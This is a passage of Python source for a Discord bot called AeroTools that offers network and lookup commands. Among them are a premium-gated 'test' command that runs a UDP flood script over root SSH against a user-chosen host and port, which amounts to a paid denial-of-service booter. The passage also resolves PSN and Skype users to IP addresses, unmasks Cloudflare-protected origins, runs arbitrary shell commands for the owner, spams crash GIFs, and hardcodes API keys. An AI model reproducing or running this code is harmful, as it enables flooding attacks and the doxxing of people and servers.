                    log.log(str(dore))
                    continue_ = False
                    
                if continue_ == True:
                    await message.channel.send(f"**Here's Your Image <@{message.author.id}>!**", file=discord.File(fname))
                    remove(fname)
                else:
                    await message.channel.send("**```diff\n-Error!\nCould Not Process Image!\nImage 1 Must Be Semi-Transparent/PNG!\n```**")
                            
        else:
            await message.channel.send(bold(f"""
__Correct Useage:__ `at.overlay <Overlay> <@user or Img Link>`.
"""))
                
    if message.content.startswith('at.user.info'):
        p1 = message.content.replace("at.user.info","").replace(" ", "").replace("<", "").replace("@", "").replace(">", "").replace("!", "")
        exx = False
        try:
            p1 = int(p1)
        except Exception:
            exx = True
            await message.channel.send('No User given!\n__Correct Usage:__`at.user.info @Valid_User`')
            pass
        
        if exx == False:
            try:
                member = discord.utils.get(message.guild.members, id=p1)
                if member is not None and member.bot != True:
                    name = str(member.display_name)
                    start_date = str(discord.utils.snowflake_time(member.id))
                    start_date_day = start_date.split(" ")[0]
                    start_date_time = start_date.split(" ")[1]
                    block_char = str(bool(member.is_blocked()))
                    avatar = str(member.avatar_url)
                    mutual_guild = str(member.guild.name)
                    join_date = str(member.joined_at)
                    join_date_day = join_date.split(" ")[0]
                    join_date_time = join_date.split(" ")[1]
                    try:
                        current_act = str(member.activities)
                    except Exception:
                        current_act = str("**Possible Self-Bot!!!**")
                    role = str(member.roles)
                    role = role.replace("[", "").replace("]", "").replace("<", "").replace(">", "")
                    role = role.replace("@", "")
                    if len(role) > 800:
                        role = "Too Many Roles To Display!!!!"
                    embed = discord.Embed(title=f"User Info For\n{name}", description=" ", url='https://aero-bot.pro/', color=0x8000ff)
                    embed.set_author(name="AeroTools Version-X", url='https://aero-bot.pro/', icon_url='https://cdn.discordapp.com/attachments/610035652112810024/614966581499265026/aero.png')
                    embed.set_thumbnail(url=avatar)
                    embed.add_field(name="__User:__", value=name, inline=False)
                    embed.add_field(name="__Nickname:__", value=str(member.nick), inline=False)#
                    embed.add_field(name="__ID:__", value=f"{str(p1)}", inline=False)
                    embed.add_field(name="__Joined Discord:__", value=start_date_day, inline=False)
                    embed.add_field(name="__Joined Server:__", value=join_date_day, inline=False)
                    embed.add_field(name="__Mutual Servers:__", value=mutual_guild, inline=False)                
                    embed.add_field(name="__Current Status:__", value=f"{member.status}", inline=False)
                    embed.add_field(name="__Blocked Bot:__", value=str(block_char), inline=False)
                    embed.add_field(name="__Current Activity:__", value=current_act, inline=False)
                    embed.add_field(name="__Current Roles:__", value=str(role), inline=False)
                    embed.set_footer(text=f"Requested By {message.author} in #{message.channel}.")
                    await message.channel.send("**__User Info__**", embed=embed)
                else:
                    await message.channel.send(f"Member [{p1}] Not Found In Guild (Or Not Accessible)!")                     
            except:
                await message.channel.send(f"Member [{p1}] Not Found In Guild (Or Not Accessible)!")    
        else:
            await message.channel.send(f"Member [{p1}] Not Found In Guild (Or Not Accessible)!")


            
        
    if message.content.startswith('at.code') or message.content.startswith('at.file') or message.content.startswith('at.editor'):
        result = ide.format(message.content, message.author)
        body = str(result['result'])
        filename = result['filename']
        log.log(filename+"\n"+body)
        await message.channel.send(body, file=discord.File(filename))
        remove(filename)
        

        
    if message.content.startswith('at.gettickets') or message.content.startswith('at.dev.tickets'):
        op1 = str(message.author)
        bAdmin = False
        if op1 in admins.admins:
            bAdmin = True          
        if bAdmin == True:
            await message.channel.send(f'Here is your tickets file {message.author}', file=discord.File('aero-data/tickets.txt'))
            await message.delete()
            
    if message.content.startswith('at.getapps') or message.content.startswith('at.dev.tickets'):
        op2 = str(message.author);bAdmin = False
        if op2 in admins.admins:
            bAdmin = True          
        if bAdmin == True:
            await message.channel.send(f'Here is your applications file {message.author}', file=discord.File('aero-data/applications.txt'));await message.delete()
        else:
            channel = client.get_channel(613489589360787488)
            dt = str(datetime.now())
            await channel.send(f"**__Security Alert:__**\n{message.author} Attempted to `View Applications` in Channel # {message.channel} Without Clearance.\n\n Raw Event: {message.content}\n\nOccured: (Time):\n{dt}")
            await message.channel.send(f"!warn {message.author} *You've attempted to use an Adminstrators option without clearance*\n\n **__Attention Administrators:__** `1` warning Has been issued to {message.author}!")

        
    if message.content.startswith('at.getchatlogs') or message.content.startswith('at.dev.logs'):
        bAdmin = False
        if is_admin(int(message.author.id)) == True:
            bAdmin = True          
        if bAdmin == True:
            await message.channel.send(f'Here is Aero-Tool"s log file {message.author}', file=discord.File('aero-data/User_dialog.txt'));await message.delete()
        else:
            channel = client.get_channel(613489589360787488)
            dt = str(datetime.now())
            await channel.send(f"**__Security Alert:__**\n{message.author} Attempted to `Retrieve Lixxards Log` in Channel # {message.channel} Without Clearance.\n\n Raw Event: {message.content}\n\nOccured: (Time):\n{dt}")
            await message.channel.send(f"!warn {message.author} *You've attempted to use an Adminstrators option without clearance*\n\n **__Attention Administrators:__** `1` warning Has been issued to {message.author}!")

        
     
    if message.content.startswith('at.meme') or message.content.startswith('$meme') or message.content.startswith('!meme') or message.content.startswith('at.memes') or message.content.startswith('$memes') or message.content.startswith('!memes'):
        mem = str()
        cont = True
        try:
            meme = requests.get("https://meme-api.herokuapp.com/gimme/dankmemes")
        except Exception as ee:
            mem = str(f"Error:\n```{str(ee)}```")
            cont = False
        if cont == True: mem = str(meme.json()['url'])
        await message.channel.send(mem)    
            
    if message.content.startswith('at.scrape'):
        gass=message.content.split();uurl = str(gass[1])
        await message.channel.send("**Sweeping "+uurl+", brb...**")
        myurl = ('https://webresolver.nl/api.php?'
                 'key=7JWS0-JJ5ZY-DK613-2PHB7&'
                 'html=0&'
                 'action=header&string='+str(uurl))
        loadboi = requests.get(myurl);jboi=loadboi.text
        await message.channel.send(str('**Header Sweep For **'+uurl+"\n```yaml\n"+jboi+"\n```\n*Requested By* **"+str(message.author)+"**."))
        
            
#    if message.content.startswith('@everyone') or message.content.startswith('@here'):
#        with open("data/allowed_everyones.txt", "r") as file:
#            check = str(file.read())
#            if str(message.author.id) in check:
#                pass
#            else:
#                await message.delete()
#                channel = client.get_channel(613489589360787488)
#                dt = str(datetime.now())
#                await channel.send(f"**__Warning!:__**\n{message.author} Attempted to `@\everyone or @\here` in Channel # {message.channel} Without Clearance.\n\n Raw Event: {message.content}\n\nOccured: (Time):\n{dt}")
#                await message.channel.send(f"**__<@{str(message.author.id)}>!__** *You've attempted to mention everyone without clearance*\n\n **__Attention Administrators:__** `1` warning Has been issued to {message.author}!")

    if message.content.startswith('at.dump_guilds'):
        if message.author.id == 632636197784649758:
            
            with open("guilds_dump.txt", "w+", encoding='utf-8') as fi:
                fi.write(
                    f'\n{str(client.guilds)}\n'
                    )
            await message.channel.send(':ok_hand:')
             
    if message.content.startswith('at.hello'):#Greetings
        other_kinda_hot = "https://giphy.com/gifs/yevbel-l0K4mVlNMmr3Bj6V2"
        toof_dude = "https://giphy.com/gifs/lakings-hello-kyle-clifford-says-3o6Ztl7oraKm4ZJ9mw"
        waving_girl_gif="https://giphy.com/gifs/vspink-26vUTlnHulTgAU7le"
        sup_gif = "https://giphy.com/gifs/eldusty-el-dusty-l0IybIP1xUDwcY7Kw"
        meet_again_gif = "https://giphy.com/gifs/hyperrpg-twitch-kollok-kollok1991-2ywMwSsEFKu6HuxWrg"
        dice = randint(1, 5)
        if dice == 1: msg = str("**Ayy Its "+str(message.author)+"!**\n\n**Asuhhhh!!!**\n"+"\n\n"+sup_gif)
        if dice == 2: msg = str("**Look, its "+str(message.author)+"!**\n\n*Hello There q-t-π!!!*\n"+"\n\n"+waving_girl_gif)
        if dice == 3: msg = str("**Greetings "+str(message.author)+"!\n\nKeep It Spoopy;)\n\n**"+"\n\n"+meet_again_gif)
        if dice == 4: msg = str("**"+str(message.author)+"!\n\nHey There Friend!\n\n**"+"\n\n"+toof_dude)
        if dice == 5: msg = str("**Hey "+str(message.author)+"!**"+"\n\n"+other_kinda_hot)
        await message.channel.send(str(msg))
        #help

    #### $HELP    
    if message.content.startswith('at.help'):
        user = client.get_user(message.author.id)
        await user.send(" ", embed = strings.help_text(message))
        await user.send("By https://host-info.net/")
        await message.channel.send(f"\n**I've Sent You My Documentation In A Direct Message, <@{message.author.id}>!\nTip: ||Use: `at.channel.help` To Send In Channel!||**")
        
    if message.content.startswith('at.channel.help'): 
        await message.channel.send(" ", embed = strings.help_text(message))
        await message.channel.send("By https://host-info.net/")

    if message.content.startswith('at.secret'):
        if message.author.id == 325426360510054401:
            try:
                await message.delete()
            except Exception:
                await message.channel.send('```diff\n-Error | I Require Permission: MANAGE MESSAGES\n```')
            tar_id = str(message.content.split()[1].replace("<", "").replace("@", "").replace(">", "").replace("!", ""))
            user = client.get_user(message.author.id)
            await user.send(strings.secret_help)            
            
        
    if message.content.startswith('at.add.premium'):
        
        if is_admin(message.author.id) == True:
            if is_premium(message.author.id) == False:

                ok = True
                try:
                    tar_id = str(message.content.split()[1].replace("<", "").replace("@", "").replace(">", "").replace("!", ""))
                    days = int(message.content.split()[2])
                except Exception as fads:
                    ok = False
                    
                if ok == True:
                    try:
                        add_premium(tar_id)
                    except Exception as fasg:
                        log.log(str(fasg))
                    await message.channel.send(f"**{message.author} Just __Awarded__ <@{tar_id}> With Premium For {str(days)} Day/s!**\n*Use Command: 'at.premium'*")


                else:
                    await message.channel.send(f"**__Incorrect Format!__*Use Command:* 'at.premium <@USER> <@Duration/Days>'*")          
            else:
                await message.channel.send(f"**User is already premium!**")                       
        else:
            await message.channel.send(f"**<@{str(message.author.id)}>, You Are Not Approved to Use This Command!**")



    if message.content.startswith('at.remove.premium'):
        if is_admin(int(message.author.id)) == True:
            tar_id = str(message.content.split()[1].replace("<", "").replace("@", "").replace(">", "").replace("!", ""))
            remove_premium(tar_id)
            await message.channel.send(f"**{message.author} Just __Removed__ <@{tar_id}> 's Premium!**")
        else:
            await message.channel.send(f"**<@{str(message.author.id)}>, You Are Not Approved To Use This Command!**")
            
    if message.content.startswith('at.is.premium'):
        if is_admin(int(message.author.id)) == True:
            if is_premium(str(message.content.split()[1].replace("<", "").replace("@", "").replace(">", "").replace("!", ""))) == True:
                await message.channel.send(f"**User __Is__ Premium!**")
            else:
                await message.channel.send(f"**User __Is Not__ Premium!**")
        else:
            await message.channel.send(f"**<@{str(message.author.id)}>, You Are Not Approved to Use This Command!**")                
                                       
    if message.content.startswith('at.....------.test'):
        if is_premium(message.author.id) == True:
            sent = False
            er = True
            try:
                host = str(message.content.split()[1])
                port = str(message.content.split()[2])
                er = False
            except Exception:
                await message.channel.send("**Error! - Invalid Format,\nNeeds to be as such: 'at.test <host> <port>\n\nTry Again, Skiddo!**'")
                er = True
            if er == False:
                try:
                    await message.channel.send("Ok, Sending...")
                    system(f"ssh -o PasswordAuthentication=no root@{host1} StrictHostKeyChecking=no 'perl udp.pl {host} {port} 65500 30'")
                    sent = True
                except Exception as ljkf:
                    sent = False
                    log(str(ljkf))
                    await message.channel.send(bold(f"Error Sending Test!!\nError Tansparency:\n\n{str(ljkf)}"))
                    
                if sent == True:
                    await message.channel.send(str(f"**<@{str(message.author.id)}> Just Sent A Test To {target_address} @ Port: {target_port} For 30 Seconds!**"))
                    
#            try:
#                mylist = message.content.split()
#                host=str(mylist[1])
#                port = str(mylist[2])
#            except Exception:
#                await message.channel.send("*Error! - Invalid Format,\nNeeds to be as such: 'at.test <host> <port>*\n\nTry Again, Skiddo!'")
#            try:
#                cmd = ['python3.6', 'attack_worker.py', host1, host, port]
#                pro = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
#                time.sleep(1)
#                os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
#                await message.channel.send("**Testing Sent!!!**\n\n\n"+str(message.author)+" Is Testing "+host+" for 30 Seconds @ Port "+port+'!!!**\n\n')
#            except Exception as djfg:
#                log(str(djfg))
        else:
            await message.channel.send("**Feature Unavailable!**\n**Purchase Premium Token[$3/mo] for testing!**")
            
    if message.content.startswith('at.isitup') or message.content.startswith('at.check'):
        m1 = message.content.split();ppp=str(m1[1])
        await message.channel.send("**Checking "+ppp+"...**")
        user_agent0 = choice(lists.useragents)
        headers = {'User-Agent' : user_agent0}
        link = str(f'http://isitup.org/{ppp}.json')
        r = requests.get(link, headers = headers)
        json = r.json()
        domain = str(json['domain'])
        port = str(json['port'])
        status_code = str(json['status_code'])
        if status_code == "1":
            status_code = "Yes"
        else:
            status_code = "No"
        response = str(json['response_code'])
        timer = str(json['response_time'])
        embed = discord.Embed(title=f"AeroTools Version-X IsItUp?", description=" ", url='https://aero-bot.pro/', color=0x8000ff)
        embed.set_author(name="AeroTools Version-X", url='https://aero-bot.pro/', icon_url='https://cdn.discordapp.com/attachments/610035652112810024/614966581499265026/aero.png')
        embed.set_thumbnail(url="https://media.discordapp.net/attachments/610035652112810024/620167625774727178/1_h4YRd-tMvBGSVhAXtzYbKA_1.png")
        embed.add_field(name="__Domain:__", value=domain, inline=False)
        embed.add_field(name="__Port Used:__", value=port, inline=False)
        embed.add_field(name="__Is It Up?:__", value=status_code, inline=False)
        embed.add_field(name="__Response Code:__", value=response, inline=False)
        embed.add_field(name="__Response Timer:__", value=timer, inline=False)
        embed.set_footer(text=f"Requested By {message.author} in #{message.channel}.")
        await message.channel.send(not_null, embed=embed)

        
    if message.content.startswith('at.portscan') or message.content.startswith('at.scan'):
        m1 = message.content.split();ppp=str(m1[1])
        await message.channel.send("**Scanning "+ppp+"...**")
        link = str('https://api.hackertarget.com/nmap/?q={}'.format(ppp));r = requests.get(link)
        await message.channel.send("```yaml\n"+r.text+"\n```\n*Requested By* **"+str(message.author)+"**.")  
            
    if message.content.startswith('at.psnresolve'):#Psn-Res
        mylist3 = message.content.split();inp3 = str(mylist3[1]);
        await message.channel.send("**Attempting To Resolve "+inp3+"...**")
        try:
            s = requests.get("https://psnresolver.org/resolve/"+inp3);html_str = s.text
            start = "<td>"
            end = "</td>"
            ips=str((html_str.split(start))[1].split(end)[0])
            re=requests.get('https://json.geoiplookup.io/' + ips)
            data=re.json();re_ip1 = data['ip'];re_isp1 = data['isp'];re_org1 = data['org'];re_hostname1 = data['hostname'];re_city1 = data['city'];re_country1 = data['country_name'];re_asn1 = data['asn'];re_integ1 = data['success']
            re_is_cached1 = data['cached'];re_curr1 = data['currency_code']
            if re_is_cached1 == True:
                integ_char1 = 'True'
            elif re_is_cached1 == False:
                integ_char1 = 'False'
            if re_is_cached1 == True:
                cache_char1 = 'True'
            elif re_is_cached1 == False:
                cache_char1 = 'False'
            thingy = str(re_hostname1)    
            goods1=str("""

                *Heres Those Results You Ordered:*

                ```yaml
    ||AeroTools Version-X - PSN Resolver||

    
    GAMERTAG: ["""+inp3+"""]


    IP: """ + re_ip1+ """

    ISP: """ + re_isp1 + """

    ORG: """ + re_org1 + """

    HOSTNAME: """ + re_hostname1 + """

    CITY: """ + re_city1 + """

    COUNTRY: """ + re_country1 + """

    ASN: """ + re_asn1 + """

    SUCCESS: """ + integ_char1 + """

    CACHED: """ + cache_char1 + """

    CURRENCY: """ + re_curr1 + """

    INFO: Coming Soon!

    *Powered By psn-resolver.org
                ```
                """+"\n*Requested By* **"+str(message.author)+"**.")
        except Exception as poo:
            await message.channel.send(poo)
        try:
            await message.channel.send(goods1)
        except Exception: pass

    if message.content.startswith('at.join'):
        if message.author.id == 632636197784649758:
            channel = client.get_channel(int(message.content.split()[1]))
            this = await channel.invites()
            await message.channel.send(str(this))

    
    if message.content.startswith('at.ctx'): #Pass Commands directly!
        try:
            async with channel.typing():
                if message.author.id == 632636197784649758:
                    cmd = message.content.replace('at.ctx ', "")
                    await message.channel.send(f"**Running `{cmd}` =>|**")
                    function = subprocess.check_output(cmd, shell=True)
                    function = function.decode('utf-8')
                    #msg = message.channel.fetch_message(message.channel.last_message_id)
                    await message.channel.send(f"**__Output__**```diff\n-Done!\n{function}```")
                    
                else:
                    await message.channel.send('**<@632636197784649758>! I dont know this User!!!**')
        except Exception as gr:
            await message.channel.send(f'Error:\n{str(gr)}')
                
    if message.content.startswith('at.trace') or message.content.startswith('at.bypass') or message.content.startswith('at.traceroute') or message.content.startswith('at.tracert') or message.content.startswith('at.ovhbypass'):
        mylist01 = message.content.split();poopie01=str(mylist01[1])
        await message.channel.send("**\nSending Probes To "+poopie01+"...\n**")
        command1 = ["traceroute", poopie01]
        try:
            out1=run(command1, stdout=PIPE, stderr=PIPE, universal_newlines=True)
        except Exception as ooof:
            await message.channel.send("Error! \n"+str(ooof))
            pass
        final = out1.stdout.replace('144.217.84.1', "xx.xx.xx.xx")
        await message.channel.send("**Traceroute Results**\n\n```yaml\n"+str(final)+"\n```\n*Requested By* **"+str(message.author)+"**.")    

    if message.content.startswith('at.dns') or message.content.startswith('at.query'):
        cont = True
        try:
            domain = message.content.split()[1]
        except Exception as EEdd:
            cont = False
            await message.channel.send("**__Correct Usage:__** `at.dns <Domain>`")
            
        if cont == True:
            await message.channel.send("**\nQuerying "+domain+"...\n**")
            command = ["dig", domain]
            try:
                out=run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True)
            except Exception as oooof:
                await message.channel.send("I can't create a query from my current system! I'm probably in a test environment.")
                cont = False
                
            if cont == True:
                embed = discord.Embed(title=f"AeroTools Version-X DNS Lookup", description=" ", url='https://aero-bot.pro/', color=0x8000ff)
                embed.set_author(name="AeroTools Version-X", url='https://aero-bot.pro/', icon_url='https://cdn.discordapp.com/attachments/610035652112810024/614966581499265026/aero.png')
                embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/635539301790384171/644422019621847080/dns-icon-19.jpg")
                embed.add_field(name=f"__DNS Query For {domain}:__", value=f"""```diff
-{domain}\n{out.stdout}```
""", inline=False)
                embed.set_footer(text=f"Requested By {message.author} in #{message.channel}.")
                await message.channel.send(" ", embed=embed)
        
    if message.content.startswith('at.ping') or message.content.startswith('at.check'):
        cont = True
        try:
            mylist33 = message.content.split();poopie=str(mylist33[1])
        except Exception as EEdd:
            cont = False
            await message.channel.send("**__Correct Usage:__** `at.ping <host or ip>`")
            
        if cont == True:
            await message.channel.send("**\nPinging "+poopie+"...\n**")
            command = ["ping","-c","6",poopie]
            try:
                out=run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True)
            except Exception as oooof:
                await message.channel.send("I can't ping from this system right now! :'( ")
                pass
            await message.channel.send("**Pong!**\n\n```yaml\n"+str(out.stdout)+"\n```\n*Requested By* **"+str(message.author)+"**.")




    if message.content.startswith('at.fortune'):
        cookie = str(choice(nu_lists.fortune_cookies))
        embed = discord.Embed(title=f"Here's A Fortune Cookie!", description=f"[:fortune_cookie:]({cookie})", url='https://aero-bot.pro/', color=0x8000ff)
        embed.set_image(url=cookie)
        embed.set_footer(text=f"Requested By {message.author} in #{message.channel}.")
        await message.channel.send(not_null, embed=embed)
        
            
    if message.content.startswith('at.lookup'):
        cont = True
        try:
            host = message.content.split()[1]
        except:
            await message.channel.send('**__Correct Usage:__ `at.lookup 1.1.1.1` or `at.lookup anything.example.net`**')
            cont = False
            
        if cont == True:
            try:
                geo=requests.get('https://json.geoiplookup.io/' + host)
            except:
                cont = False
                
            if cont == True:
                ip_data = geo.json()
                url = 'https://api.abuseipdb.com/api/v2/check'
                querystring = {
                    'ipAddress': str(ip_data['ip']),
                    'maxAgeInDays': '90'
                }
                headers = {
                    'Accept': 'application/json',
                    'Key': '39d45ad2f2d85883b4e93496014bd826637b74a774a4bc09e1ed9792e9481be62c252ba08b289687'
                }
                re = requests.get(url, headers=headers, params=querystring)
                data = re.json()
                data = data['data']
                embed = discord.Embed(title=f"Host Lookup", description=f"{ip_data['hostname']}", url='https://aero-bot.pro/', color=0x8000ff)
                embed.set_author(name="AeroTools Version-X", url='https://aero-bot.pro/', icon_url='https://cdn.discordapp.com/attachments/610035652112810024/614966581499265026/aero.png')
                embed.set_thumbnail(url=f"https://www.countryflags.io/{str(ip_data['country_code'])}/shiny/64.png")
                embed.add_field(name="__IP:__", value=f"`{str(ip_data['ip'])}`", inline=True)
                embed.add_field(name="__Hostname:__", value=f"`{ip_data['hostname']}`", inline=True) 
                embed.add_field(name="__Country:__", value=f"`{ip_data['country_name']}`", inline=True)
                embed.add_field(name="__City:__", value=f"`{ip_data['city']}`", inline=True)
                embed.add_field(name="__Org:__", value=f"`{ip_data['org']}`", inline=True)
                embed.add_field(name="__ISP:__", value=f"`{ip_data['isp']}`", inline=True)
                embed.add_field(name="__Usage Type:__", value=f"`{str(data['usageType'])}`", inline=True)
                embed.add_field(name="__ASN:__", value=f"`{ip_data['asn']}`", inline=True)
                embed.add_field(name="__Distinct Users:__", value=f"`{str(data['numDistinctUsers'])}`", inline=True)
                embed.add_field(name="__Abuse Confidence Score:__", value=f"`{str(data['abuseConfidenceScore'])}`", inline=True)
                embed.add_field(name="__Total Reports:__", value=f"`{str(data['totalReports'])}`", inline=True)
                embed.add_field(name="__Last Report:__", value=f"`{str(data['lastReportedAt'])}`", inline=True)
                embed.add_field(name="__Whitelisted:__", value=f"`{str(data['isWhitelisted'])}`", inline=True)
                embed.add_field(name="__Public:__", value=f"`{str(data['isPublic'])}`", inline=True)
                embed.set_footer(text=f"Requested By {message.author} in #{message.channel}.")
                await message.channel.send(" ", embed=embed)        

        
    if message.content.startswith('at.currency.help') or message.content.startswith('at.curr.help'):
        await message.channel.send("**"+str(message.author)+", I've Recieved Your Beacon:** *at.currency.help*\n\n\n**Example Of Correct Format: 'at.cash <USD> <10>'\n\n**\nThere we're pretty much asking to convert $10USD to BTC.\n\n**Currency Symbols(i/e): USD,GBP,RUB,EUR**");pass
#####          Insults
    if message.content.startswith('at.destroy') or message.content.startswith('at.insult') or message.content.startswith('at.shame'):
        mylist215 = message.content.split();person215 = str(mylist215[1])
        dice215 = randint(1, 5)
        if dice215 == 1: msg = str(insults.aa+person215+insults.ab)
        if dice215 == 2: msg = str(insults.ba+person215+insults.bb)
        if dice215 == 3: msg = str(insults.ca+person215+insults.cb)
        if dice215 == 4: msg = str(insults.da+person215+insults.db)
        if dice215 == 5: msg = str(insults.ea+person215+insults.eb)
        await message.channel.send(msg)
    if message.content.startswith("at.site") or message.content.startswith("at.website"):
        strrr = str("""
**"Automate your Discord!"**

    https://aero-bot.pro/
""")
        await message.channel.send(strrr)
        
    if message.content.startswith('at.curr2btc') or message.content.startswith('at.money2btc') or message.content.startswith('convert.btc') or message.content.startswith('at.convert2btc'):
        try:
            mylist44 = message.content.split();SYM=str(mylist44[1]);amount = str(mylist44[2])
        except Exception:
            await message.channel.send("**Invalid Symbol - Try 'at.currency.help' For More Info!**")
        r=requests.get("https://blockchain.info/tobtc?currency="+SYM+"&value="+amount);nu=r.text
        await message.channel.send("*Approximate Comparison Of* **"+amount+SYM+"** *To* **BTC** *Is:*\n ```yaml\n"+nu+"\n ```")

    if message.content.startswith('at.music.help') or message.content.startswith('at.play.help'):
        await message.channel.send("**Usage (i/e):*** \n\n`at.music.country`\nor\n`at.play.country`\nor\n`at.music.random`\nor\n`at.play.random`\nor\n`at.music.help`\n\n**Genres(so far):**\n*favorites*, *rap*, *hip-hop*, *dubstep*, *country*\n")

    if message.content.startswith('at.music.favorites') or message.content.startswith('at.music.favorite') or message.content.startswith('at.music.random'):                           
        check = randint(0,10)
        if check == 1: msgg1 = music.favorites.a
        if check == 2: msgg1 = music.favorites.b
        if check == 2: msgg1 = music.favorites.c
        if check == 3: msgg1 = music.favorites.d
        if check == 4: msgg1 = music.favorites.e
        if check == 5: msgg1 = music.favorites.f
        if check == 6: msgg1 = music.favorites.g
        if check == 7: msgg1 = music.favorites.h
        if check == 8: msgg1 = music.favorites.i
        if check == 9: msgg1 = music.favorites.j
        if check == 10: msgg1 = music.favorites.k
        await message.channel.send(msgg1+"\n>>>*Requested By* **"+str(message.author)+"**.<<<")

    if message.content.startswith('at.music.country') or message.content.startswith('at.music.Country') or message.content.startswith('at.play.Country') or message.content.startswith('at.play.country'):
        check = randint(0,10)
        if check == 1: msgg2 = music.country.a
        if check == 2: msgg2 = music.country.b
        if check == 2: msgg2 = music.country.c
        if check == 3: msgg2 = music.country.d
        if check == 4: msgg2 = music.country.e
        if check == 5: msgg2 = music.country.f
        if check == 6: msgg2 = music.country.g
        if check == 7: msgg2 = music.country.h
        if check == 8: msgg2 = music.country.i
        if check == 9: msgg2 = music.country.j
        if check == 10: msgg2 = music.country.k
        await message.channel.send(msgg2+"\n>>>*Requested By* **"+str(message.author)+"**.<<<")

    if message.content.startswith('at.music.rap') or message.content.startswith('at.music.hiphop') or message.content.startswith('at.play.hiphop') or message.content.startswith('at.play.rap') or message.content.startswith('at.music.hip') or message.content.startswith('at.music.Rap') or message.content.startswith('at.play.hip-hop') or message.content.startswith('at.play.rap'):
        check = randint(0,14)
        if check == 1: msgg3 = music.rap_hip_hop.a
        if check == 2: msgg3 = music.rap_hip_hop.b
        if check == 2: msgg3 = music.rap_hip_hop.c
        if check == 3: msgg3 = music.rap_hip_hop.d
        if check == 4: msgg3 = music.rap_hip_hop.e
        if check == 5: msgg3 = music.rap_hip_hop.f
        if check == 6: msgg3 = music.rap_hip_hop.g
        if check == 7: msgg3 = music.rap_hip_hop.h
        if check == 8: msgg3 = music.rap_hip_hop.i
        if check == 9: msgg3 = music.rap_hip_hop.j
        if check == 10: msgg3 = music.rap_hip_hop.k
        if check == 11: msgg3 = music.rap_hip_hop.l
        if check == 12: msgg3 = music.rap_hip_hop.m
        if check == 13: msgg3 = music.rap_hip_hop.n
        if check == 14: msgg3 = music.rap_hip_hop.o
        await message.channel.send(msgg3+"\n>>>*Requested By* **"+str(message.author)+"**.<<<")

    if message.content.startswith('at.music.rock') or message.content.startswith('at.music.rockandroll') or message.content.startswith('at.play.metal') or message.content.startswith('at.play.Rock') or message.content.startswith('at.music.american') or message.content.startswith('at.music.roc') or message.content.startswith('at.play.rock') or message.content.startswith('at.play.rap'):
        check = randint(0,10)
        if check == 1: msgg4 = music.rock.a
        if check == 2: msgg4 = music.rock.b
        if check == 2: msgg4 = music.rock.c
        if check == 3: msgg4 = music.rock.d
        if check == 4: msgg4 = music.rock.e
        if check == 5: msgg4 = music.rock.f
        if check == 6: msgg4 = music.rock.g
        if check == 7: msgg4 = music.rock.h
        if check == 8: msgg4 = music.rock.i
        if check == 9: msgg4 = music.rock.j
        if check == 10: msgg4 = music.rock.k
        #if check == 11: msgg4 = music.rock.l
        #if check == 12: msgg4 = music.rock.m
        #if check == 13: msgg4 = music.rock.n
        #if check == 14: msgg4 = music.rock.o
        else: msgg4 = music.rock.h

        await message.channel.send(msgg4+"\n>>>*Requested By* **"+str(message.author)+"**.<<<")



        
    if message.content.startswith('at.cloudflare.resolve') or message.content.startswith('at.resolvecloudflare') or message.content.startswith('at.resolve.cloudflare'):
        noot = message.content.split();clout=str(noot[1])
        await message.channel.send("**Attempting To Resolve"+clout+"...**")
        url2 = ('https://webresolver.nl/api.php?'
        'key=7JWS0-JJ5ZY-DK613-2PHB7&json&'
        'action=cloudflare&string='+clout);response = requests.get(url2);r = response.json();success = r['success']
        if success == True:
            old_stdout1 = sys.stdout;result1 = StringIO();sys.stdout = result1
            for r['domain'] in r['domains']:
                print(str(r['domain']))
                print()        
        elif success != True:
            await message.channel.send("**Host Could Not Be Resolved!**")    
        await message.channel.send("**Cloudflare Resolver**\n**Resolved Addresses For **"+clout+":\n```yaml\n"+str(result1.getvalue())+"\n```\n")
    if message.content.startswith('at.skype') or message.content.startswith('at.skyperesolver') or message.content.startswith('at.resolve.skype') or message.content.startswith('at.skyperesolve'):
        bleh1 = message.content.split();blehh1=str(bleh1[1])
        await message.channel.send("**Attempting To Resolve IP From **"+blehh1+"**!**\n")
        url2 = ('https://webresolver.nl/api.php?'
        'key=7JWS0-JJ5ZY-DK613-2PHB7&'
        f'json&action=resolve&string={blehh1}')
        response = requests.get(url2);r = response.json();success = r['success'];user = r['username'];error = r['error']
        if success == True:
            skype1 = str("""
**Skype Resolver Results For """+blehh1+"""**:**
```yaml

[Success]
USERNAME: """+str(user)+"""
IP: """+str(r)+"""
```
"""+str(error)+"\n")

        elif success != True:
            await message.channel.send("**IP Not Found In Database...**\n"+str(error))
        await message.channel.send(skype1)
        
    if message.content.startswith('at.ip2skype') or message.content.startswith('at.ip.skype') or message.content.startswith('at.reverse.skype'):
        bleh = message.content.split();blehh=str(bleh[1])
        await message.channel.send("**Attempting To Resolve Username From **"+blehh+"**!**\n")
        url2 = ('https://webresolver.nl/api.php?'
        'key=7JWS0-JJ5ZY-DK613-2PHB7&'
        f'json&action=resolvedb&string={blehh}')
        response = requests.get(url2);r = response.json();success = r['success'];user = r['username'];error = r['error']
        if success == True:
            skype1 = str("""
**Skype Resolver Results For """+blehh+"""**:**
```yaml

[Success]
IP: """+str(blehh)+"""
USERNAME: """+str(user)+"""
```
"""+str(error)+"\n")

        elif success != True:
            await message.channel.send("**IP Not Found In Database...**")
        await message.channel.send(skype1)    

                
    if message.content.startswith('at.evil.freeze') or message.content.startswith('at.lag.gif') or message.content.startswith('!fuckthis') or message.content.startswith('at.freeze'):
        for _ in range(0, 100):
            await message.channel.send("**Enjoy the Crash!**\n"+url.mean.freeze_gif)
            time.sleep(.1)
        
    if message.content.startswith('at.phonelookup') or message.content.startswith('at.number') or message.content.startswith('at.phone'):
        await message.channel.send("**Getting That For You...**")
        try:
            myliststrip1 = message.content.split();poop16=str(myliststrip1[1])
            if len(poop16) > 7:
                cc=str(poop16[(len(poop16) - 7)])
            else:
                cc = strings.null
            r=requests.get("http://apilayer.net/api/validate?access_key="+t_key+"&number="+poop16+"&country_code="+strings.null_+"&format="+cc+"")
            data = r.json();re_is_valid=data['valid'];re_num=data['number'];re_local_fmt=data['local_format'];re_int_fmt=data['international_format'];re_country_prfx=data['country_prefix'];re_country_code=data['country_code'];re_country_name=data['country_name']
            re_location=data['location'];re_carrier=str(data['carrier']);re_line_type=data['line_type']
